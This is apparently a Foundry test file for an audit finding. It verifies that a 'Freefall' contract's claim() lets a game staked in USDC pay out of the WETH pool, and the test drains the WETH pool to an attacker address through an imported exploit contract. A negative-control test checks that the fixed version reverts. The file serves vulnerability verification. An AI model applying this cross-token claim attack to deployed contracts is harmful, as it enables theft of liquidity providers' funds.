// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    Freefall,
    FreefallFixed,
    MiniToken
} from "./65079-h-01-claim-allows-payouts-from-an-arbitrary-token-pool-not-t.sol";

// Abster Freefall — [H-01] claim() allows payouts from an arbitrary token pool.
// The exploit stakes a game in USDC (small pool) yet claims the payout out of the
// WETH pool (large pool), draining WETH liquidity the attacker never wagered.
contract FreefallArbitraryPoolClaimTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_crossTokenClaim_drainsUnwageredWethPool() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken weth = MiniToken(e.wethAddr());

        // Payout is computed from the USDC bet (1e18 * 100x) = 100 WETH.
        assertEq(e.payout(), 100 ether, "payout magnitude");

        // The game was staked entirely in USDC — the attacker never wagered WETH.
        assertEq(e.gameTokenAddress(), e.usdcAddr(), "game token must be USDC");

        // Cross-asset theft: the attacker EOA receives the full 100 WETH payout.
        assertEq(e.attackerWethGain(), 100 ether, "attacker gained the WETH payout");
        assertEq(weth.balanceOf(ATTACKER), 100 ether, "stolen WETH landed at the attacker EOA");

        // The WETH pool (and the contract's real WETH balance) drained to zero.
        assertEq(e.wethPoolBefore(), 100 ether, "WETH pool before");
        assertEq(e.wethPoolAfter(), 0, "WETH pool fully drained");
        assertEq(e.freefallWethBalBefore(), 100 ether, "contract WETH before");
        assertEq(e.freefallWethBalAfter(), 0, "contract WETH after");
        assertLt(e.wethPoolAfter(), e.wethPoolBefore(), "pool strictly decreased");

        // Negative control: the fixed variant (require _tokenAddress == game.tokenAddress)
        // reverts the identical cross-token claim, proving the missing check is the cause.
        assertTrue(e.fixedRevertedOnCrossTokenClaim(), "fixed variant rejects cross-token claim");
    }

    // Explicit, independent negative control: rebuild the scenario against the FIXED
    // contract and assert the cross-token claim reverts while the same-token claim works.
    function test_control_fixedBindsClaimToGameToken() public {
        MiniToken usdc = new MiniToken("USD Coin", "USDC");
        MiniToken weth = new MiniToken("Wrapped Ether", "WETH");
        FreefallFixed f = new FreefallFixed();

        usdc.mint(address(this), 5_000 ether);
        weth.mint(address(this), 100 ether);
        usdc.approve(address(f), type(uint256).max);
        weth.approve(address(f), type(uint256).max);
        f.addLiquidity(address(usdc), 5_000 ether);
        f.addLiquidity(address(weth), 100 ether);

        usdc.mint(address(this), 1 ether);
        f.createGame(address(usdc), 1 ether, "g1");
        f.resolve("g1", 1_000_000); // 100x

        // Cross-token claim (WETH pool for a USDC game) must revert.
        vm.expectRevert(bytes("Invalid token for claim"));
        f.claim(address(weth), "g1");

        // Same-token claim (the correct USDC pool) succeeds and pays 100 USDC.
        f.claim(address(usdc), "g1");
        assertEq(usdc.balanceOf(address(this)), 100 ether, "correct USDC payout from the right pool");
        // WETH pool untouched by the reverted cross-token claim.
        assertEq(weth.balanceOf(address(f)), 100 ether, "WETH pool intact under the fix");
    }
}
